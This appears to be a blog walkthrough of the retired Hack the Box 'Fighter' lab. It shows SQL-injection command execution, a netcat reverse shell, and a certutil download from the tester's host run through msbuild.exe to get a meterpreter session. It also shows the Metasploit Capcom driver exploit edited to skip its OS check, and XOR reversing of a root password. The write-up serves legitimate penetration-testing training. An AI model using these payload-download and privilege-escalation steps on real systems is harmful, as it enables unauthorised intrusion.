@@ -1,0 +1,425 @@
+
+								
+																		Hack the Box: Fighter Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on January 8, 2019
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Fighter”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Intermediate
+Task: To find user.txt and root.txt file
+Note: Since these labs are online available therefore they have a static IP. The IP of Fighter is 10.10.10.72
+Penetrating Methodology
+
+Network scanning (Nmap)
+Browsing IP address through HTTP
+Adding Domain name to /etc/hosts
+Bruteforcing subdomains
+Adding new domain name to /etc/hosts
+RCE using SQL injection
+Upgrading shell to meterpreter session
+Finding vulnerable service
+Editing Exploit to bypass OS check
+Finding root.exe
+Reversing program to find the password
+Creating a C-program to find the password
+Getting the root flag
+
+Walkthrough
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap -sV -sC -T4 10.10.10.72
+			
+				
+					
+				
+					1
+				
+						nmap -sV -sC -T4 10.10.10.72
+					
+				
+			
+		
+
+
+The Nmap output shows us that there is only 1 port open: 80(HTTP)
+
+We find that port 80 is running http, so we open the IP in our browser.
+In the homepage, we find the Domain name “streetfighterclub.htb”. We add the domain to our /etc/hosts file.
+
+We don’t find anything new on the webpage, but further looking into the webpage we find that there might be subdomains available that will give us more clues. We intercept the request and send it to the intruder. We select where we want to brute force the request.
+
+We select the wordlist, we use namelist.txt located in /usr/share/dnsrecon/.
+
+After bruteforcing, we find a subdomain called “members.streetfighterclub.htb” that gave HTTP code 403.
+
+We add the subdomain in /etc/hosts so that we can access the web site.
+
+We open the webpage and got a 403 Forbidden error.
+
+We now run a dirb scan on the members.streetfighter.htb and find a directory called “old”.
+
+		
+		
+			
+			
+			
+			
+dirb http://members.streetfighterclub.htb/
+			
+				
+					
+				
+					1
+				
+						dirb http://members.streetfighterclub.htb/
+					
+				
+			
+		
+
+
+We then find web pages inside that directory. As we know that it is IIS server we find “asp” files on the web server and find a page called “login.asp”.
+
+		
+		
+			
+			
+			
+			
+dirb http://members.streetfighterclub.htb/old -X .asp
+			
+				
+					
+				
+					1
+				
+						dirb http://members.streetfighterclub.htb/old -X .asp
+					
+				
+			
+		
+
+
+We open the web page and find a login page.
+
+We enumerate the webpage and find that the web application is vulnerable to SQL injection.  We find username, password, and e-mail but were unable to login. So we tried command injection using SQL injection. We referred this link.
+
+We set up our listener and got a reverse shell.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 80
+			
+				
+					
+				
+					1
+				
+						nc -lvp 80
+					
+				
+			
+		
+
+
+We are not able to find anything on the target machine. So we try to convert our shell into meterpreter but are unable to run any exe file. So there was a firewall that didn’t allow us to run any exe file. We got a reference through this link on how to bypass this. We use the nps payload to create an XML file that will contain our payload (download from here).
+
+We move into “c:\users\sqlserv” as we have a shell as user sqlserv.
+
+We run the command provided by npc payload to start our listener.
+
+		
+		
+			
+			
+			
+			
+msfconsole -r msbuild_nps.rc
+			
+				
+					
+				
+					1
+				
+						msfconsole -r msbuild_nps.rc
+					
+				
+			
+		
+
+
+We start our python HTTP Server to send our file to the target machine.
+
+		
+		
+			
+			
+			
+			
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					1
+				
+						python -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+
+We download the file using certutil.exe on the target machine.
+
+		
+		
+			
+			
+			
+			
+certutil.exe -urlcache -split -f http://10.10.14.3/msbuild_nps.xml msbuild_nps.xml
+			
+				
+					
+				
+					1
+				
+						certutil.exe -urlcache -split -f http://10.10.14.3/msbuild_nps.xml msbuild_nps.xml
+					
+				
+			
+		
+
+
+We then run the XML file we uploaded using msbuild.exe.
+
+		
+		
+			
+			
+			
+			
+c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe msbuild_nps.xml
+			
+				
+					
+				
+					1
+				
+						c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe msbuild_nps.xml
+					
+				
+			
+		
+
+
+As soon as we run the file we get a meterpreter session. As we can see by running sysinfo we have a 32-bit meterpreter session on a 64-bit machine.
+
+To convert it into 64-bit session, we check the processes and find the 64-bit running process. We then migrate our process to a 64-bit process and get a 64-bit session.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; ps
+meterpreter &gt; migrate 2320
+			
+				
+					
+				
+					12
+				
+						meterpreter &gt; psmeterpreter &gt; migrate 2320
+					
+				
+			
+		
+
+
+We still don’t find anything to escalate our privilege. As this machine on street fighter game, we try to google street fighter exploit and find that street fighter 5 has privilege escalation vulnerability. We find that street fighter has a service called Capcom, so we check if street fighter 5 is installed on the target machine.
+
+		
+		
+			
+			
+			
+			
+sc query capcom
+			
+				
+					
+				
+					1
+				
+						sc query capcom
+					
+				
+			
+		
+
+
+We find this Metasploit exploit here, we try to run it but are unable to get a shell as it gave an error stating that the system was not vulnerable. So we make changes to the code and comment out the section where it checks the OS version.
+
+Now we are successfully able to run the exploit.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/windows/local/capcom_sys_exec
+msf exploit(windows/local/capcom_sys_exec) &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/local/capcom_sys_exec) &gt; set lhost tun0
+msf exploit(windows/local/capcom_sys_exec) &gt; set lport 80
+msf exploit(windows/local/capcom_sys_exec) &gt; set session 2
+msf exploit(windows/local/capcom_sys_exec)&gt; run
+			
+				
+					
+				
+					123456
+				
+						msf &gt; use exploit/windows/local/capcom_sys_execmsf exploit(windows/local/capcom_sys_exec) &gt; set payload windows/x64/meterpreter/reverse_tcpmsf exploit(windows/local/capcom_sys_exec) &gt; set lhost tun0msf exploit(windows/local/capcom_sys_exec) &gt; set lport 80msf exploit(windows/local/capcom_sys_exec) &gt; set session 2msf exploit(windows/local/capcom_sys_exec)&gt; run
+					
+				
+			
+		
+
+
+When we check the uid we find that we are successfully able to get administrative rights.
+
+We enumerate the directories to find the flags and inside “c:\users\decoder\Desktop”, we find a file called “user.txt”. When we take look at the content of the file we find our first flag.
+
+We move into c:\users\Administratror\Desktop and find a file called “root.exe”. We run it and find that it asks for a password. There is also a DLL file called “checkdll.dll”, as the password might be checked using this DLL file.
+
+We download both the files into our system using meterpreter.
+
+		
+		
+			
+			
+			
+			
+download root.exe /root/Desktop
+download checkdll.dll /root/Desktop
+			
+				
+					
+				
+					12
+				
+						download root.exe /root/Desktopdownload checkdll.dll /root/Desktop
+					
+				
+			
+		
+
+
+We reverse engineer them using IDA and find that this program XOR’s 9 with each character of the variable aFmFeholH. Now analyzing with IDA tells us that the variable contains “FmfEhO1}h”.
+
+So we create a c program that XOR’s 9 with each character of “FmfEhO1}h”.
+
+We compile and run the file and get the password to be “OdioLaFeta”.
+
+When we provide the password to the root.exe we get our final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
